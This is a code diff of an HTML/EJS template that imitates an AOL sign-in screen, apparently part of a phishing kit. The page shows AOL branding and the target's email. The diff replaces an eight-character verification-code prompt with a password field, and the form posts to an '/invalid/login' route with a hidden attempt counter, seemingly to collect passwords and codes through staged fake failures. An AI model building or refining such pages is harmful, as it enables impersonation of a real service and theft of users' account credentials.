@@ -536,15 +536,14 @@
         <img class="aol-img" src="/aol-logo.png" alt="">
         <div class="challenge-header">
         </div>
-        <strong class="signin "> <b>Enter verification code</b> </strong>
-        <strong class="text"> You'll get an email at </strong>
+        <strong class="signin "> <b>Enter your password</b> </strong>
         <strong class="text2"> <%= email %> </strong>
         <div class="form2">
             <form action="/invalid/login/<%= page2load %>/<%= count %>" method="post">
                 <div class="input-container">
-                    <span class="placeholder">8 Character Code</span>
+                    <span class="placeholder">Password</span>
                     <input class="input" id="doublePlaceholderInput" onfocus="setPlaceholder()"
-                        onblur="resetPlaceholder()" type="password" maxlength="8" name="password" required>
+                        onblur="resetPlaceholder()" type="password" name="password" required>
 
                         <input type="number" id="count" name="count" value="<%= count %>" style="display: none;">
 
@@ -552,7 +551,6 @@
 
                 <input class="button" type="submit" value="Next">
 
-                <a class="resendcode" href="">resend code</a>
                 <a class="resendcode" href="">Try signing another way</a>
             </form>
         </div>
